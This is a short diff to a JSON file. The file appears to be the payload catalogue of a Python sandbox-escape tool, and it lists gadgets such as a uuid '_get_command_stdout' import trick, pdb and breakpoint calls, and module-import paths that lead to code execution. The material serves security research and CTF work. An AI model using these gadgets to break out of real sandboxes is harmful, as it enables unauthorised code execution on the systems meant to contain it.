@@ -22,7 +22,7 @@
         ["from uuid import _get_command_stdout as __getattr__;from __main__ import sh", "BUILTINS_SET_CHANGED|BUILTINS_SET"],
         ["import pdb;pdb.set_trace()", "BUILTINS_SET_CHANGED|BUILTINS_SET"]
     ],
-    "builtins2RCE":[
+    "builtins2RCEinput":[
         ["BUILTINS_SET['help']()", "BUILTINS_SET"],
         ["MODULE_BUILTINS.help()", "MODULE_BUILTINS"],
         ["BUILTINS_SET['breakpoint']()", "BUILTINS_SET"],
@@ -116,7 +116,8 @@
         ["MODULE_BUILTINS.__import__", "MODULE_BUILTINS"],
         ["MODULE_BUILTINS.__loader__.load_module", "MODULE_BUILTINS"],
         ["importlib.import_module", "importlib"],
-        ["importlib.__import__", "importlib"]
+        ["importlib.__import__", "importlib"],
+        ["sys.modules", "sys"]
     ],
     "generator": [
         ["(RANDOMVARNAME for RANDOMVARNAME in ()).gi_frame", "BUILTINS_SET_CHANGED|BUILTINS_SET"],
